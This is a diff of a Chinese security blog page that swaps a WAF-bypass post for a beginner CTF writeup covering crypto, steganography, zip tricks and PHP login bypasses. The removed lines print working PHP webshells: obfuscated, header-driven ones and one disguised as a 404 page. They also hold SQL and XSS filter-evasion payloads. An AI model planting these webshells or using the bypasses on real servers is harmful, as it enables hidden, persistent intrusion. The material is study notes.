@@ -77,7 +77,7 @@
 <link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="waf,xss,sql," />
+  <meta name="keywords" content="misc,web," />
 
 
 
@@ -93,17 +93,24 @@
 
 
 
-<meta name="description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
-<meta name="keywords" content="waf,xss,sql">
+<meta name="description" content="浙警的ctf 有很多基础套路的题 拿来复习蛮好的">
+<meta name="keywords" content="misc,web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bypass_waf">
-<meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
+<meta property="og:title" content="MCTFwriteup">
+<meta property="og:url" content="http://Merl1ng.com/2017/11/13/MCTFwriteup/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
-<meta property="og:updated_time" content="2017-07-26T05:08:52.631Z">
+<meta property="og:description" content="浙警的ctf 有很多基础套路的题 拿来复习蛮好的">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/mctf1.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/wctf2.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/mctf3.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/mctf4.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/mctf5.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/mctf6.PNG">
+<meta property="og:updated_time" content="2017-11-13T15:38:35.815Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bypass_waf">
-<meta name="twitter:description" content="一句话 bypass_waf听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来">
+<meta name="twitter:title" content="MCTFwriteup">
+<meta name="twitter:description" content="浙警的ctf 有很多基础套路的题 拿来复习蛮好的">
+<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/mctf1.PNG">
 
 
 
@@ -131,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2017/07/20/bypass_waf/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2017/11/13/MCTFwriteup/"/>
 
 
 
 
 
-  <title>bypass_waf | Merl1ng's blog</title>
+  <title>MCTFwriteup | Merl1ng's blog</title>
   
 
 
@@ -266,7 +273,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/07/20/bypass_waf/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2017/11/13/MCTFwriteup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -283,7 +290,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">bypass_waf</h1>
+          <h1 class="post-title" itemprop="name headline">MCTFwriteup</h1>
         
 
         <div class="post-meta">
@@ -295,8 +302,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-20T21:44:22+08:00">
-                2017-07-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-11-13T22:22:50+08:00">
+                2017-11-13
               </time>
             
 
@@ -318,8 +325,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
+                  <a href="/categories/writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup</span>
                   </a>
                 </span>
 
@@ -352,16 +359,43 @@
       
 
       
-        <h3 id="一句话-bypass-waf"><a href="#一句话-bypass-waf" class="headerlink" title="一句话 bypass_waf"></a>一句话 bypass_waf</h3><p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来<br><a id="more"></a><br>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
-<p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
-<p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
-<p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
-<p>姿势四 防止管理员删shell&gt;伪装成404</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line"><span class="variable">$xx</span>=getallheaders()[<span class="string">'xx'</span>];</div><div class="line"><span class="variable">$oo</span>=getallheaders()[<span class="string">'oo'</span>];</div><div class="line"><span class="keyword">if</span>(<span class="variable">$xx</span>!=<span class="string">""</span> and <span class="variable">$oo</span>!=<span class="string">""</span>)&#123;</div><div class="line">  <span class="variable">$xx</span>=gzuncompress(base64_decode(<span class="variable">$xx</span>));<span class="variable">$xx</span>(gzuncompress(base64_decode(<span class="variable">$oo</span>)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
-<h3 id="SQL-XSS-bypass-waf"><a href="#SQL-XSS-bypass-waf" class="headerlink" title="SQL XSS bypass waf"></a>SQL XSS bypass waf</h3><p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
-<p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
-<p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
-<p>姿势四 干扰字符污染法：<br>空字符 空格 TAB换行 注释 特殊的函数等等都可以<br>SQL：<code>sEleCt+1-1+vERsIoN   /*!*/       ();</code></p>
+        <p>浙警的ctf 有很多基础套路的题 拿来复习蛮好的</p>
+<a id="more"></a>
+<h3 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto 1"></a>crypto 1</h3><p>一共四道密码的 就一道学到了一点</p>
+<p>一串字符凯撒解密后</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/mctf1.PNG" alt=""></p>
+<p>但是提示数字也要移位 所以 将2改成0</p>
+<p>当然用python脚本ascii全移位就行了</p>
+<h3 id="misc-1"><a href="#misc-1" class="headerlink" title="misc 1"></a>misc 1</h3><p>lsb密码+已知明文攻击</p>
+<p>题目给了无后缀的 hint 和一张图片</p>
+<p>hint为docx文档 里面打开虽然是显示 wwwwww</p>
+<p>但是你发现回车在后面 改变字体颜色 看到 wwwwww大概在这里</p>
+<p>key.jpg藏在hint再改为zip解压后的某一文件夹下</p>
+<p>所以总体思路 图片lsb勾选三个最低位 拿到zip</p>
+<p>解压发现需要密码 里面除了flag文件还有 key.jpg 联想已知明文攻击</p>
+<p>去 hint找 改docx 看到提示 (好吧感觉也不是什么提示)</p>
+<p>再把hint改zip解压winhex看文件头 找到一个jpg的 以同样方式压缩</p>
+<p>然后已知明文攻击 但是这里需要先winrar修复一下那个压缩包 不然不行</p>
+<h3 id="misc-2"><a href="#misc-2" class="headerlink" title="misc 2"></a>misc 2</h3><p>zip伪加密+盲水印</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/wctf2.PNG" alt=""></p>
+<p>伪加密在很后面的位置 </p>
+<p><strong>顺带一提遇到过压缩包里三个文件全是伪加密的 则三个都要改</strong></p>
+<p>解压后拿到图片 但是盲水印需要原图</p>
+<p>猜测给的图里还有东西 binwalk拿到原图</p>
+<p>运行这个需要cv2库</p>
+<h3 id="web-1"><a href="#web-1" class="headerlink" title="web 1"></a>web 1</h3><p>基础复习</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/mctf3.PNG" alt=""></p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/mctf4.PNG" alt=""></p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/mctf5.PNG" alt=""></p>
+<h3 id="web-2-忘记密码"><a href="#web-2-忘记密码" class="headerlink" title="web 2 忘记密码"></a>web 2 忘记密码</h3><p>登陆框</p>
+<p>看title MD5猜测0e开头的md5 username=240610708 passward=QLTHNDT</p>
+<h3 id="web-3-php-best"><a href="#web-3-php-best" class="headerlink" title="web 3 php best!!!"></a>web 3 php best!!!</h3><p>登陆框</p>
+<p>看title secure hash algorithm(哈希算法) 数组绕过 name[]=123 pass[]=123</p>
+<p>php的sha1函数漏洞</p>
+<p>以前写的文章里有<br><img src="http://otvzfr1o1.bkt.clouddn.com/mctf6.PNG" alt=""></p>
+<h3 id="web-4-PHP加密"><a href="#web-4-PHP加密" class="headerlink" title="web 4 PHP加密"></a>web 4 PHP加密</h3><p>网页里<br>fTdydHtWOV9gaG5VXDJqPHcxPFxhbHRVfDdpPUV5TlxdQ2hpVWA= </p>
+<p>明显base64，但解密后发现没规律</p>
+<p>发现是源码泄露</p>
 
       
     </div>
@@ -391,11 +425,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/waf/" rel="tag"><i class="fa fa-tag"></i> waf</a>
+            <a href="/tags/misc/" rel="tag"><i class="fa fa-tag"></i> misc</a>
           
-            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
-          
-            <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"></i> sql</a>
+            <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i> web</a>
           
         </div>
       
@@ -408,18 +440,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/07/23/xss基础笔记/" rel="next" title="xss基础笔记">
-                <i class="fa fa-chevron-left"></i> xss基础笔记
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/07/18/一句话木马和中国菜刀/" rel="prev" title="一句话木马和中国菜刀">
-                一句话木马和中国菜刀 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/11/12/swpu2017writeup/" rel="prev" title="swpu2017writeup">
+                swpu2017writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -570,7 +598,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#一句话-bypass-waf"><span class="nav-number">1.</span> <span class="nav-text">一句话 bypass_waf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL-XSS-bypass-waf"><span class="nav-number">2.</span> <span class="nav-text">SQL XSS bypass waf</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto-1"><span class="nav-number">1.</span> <span class="nav-text">crypto 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-1"><span class="nav-number">2.</span> <span class="nav-text">misc 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc-2"><span class="nav-number">3.</span> <span class="nav-text">misc 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-1"><span class="nav-number">4.</span> <span class="nav-text">web 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-2-忘记密码"><span class="nav-number">5.</span> <span class="nav-text">web 2 忘记密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-3-php-best"><span class="nav-number">6.</span> <span class="nav-text">web 3 php best!!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-4-PHP加密"><span class="nav-number">7.</span> <span class="nav-text">web 4 PHP加密</span></a></li></ol></div>
             
 
           </div>
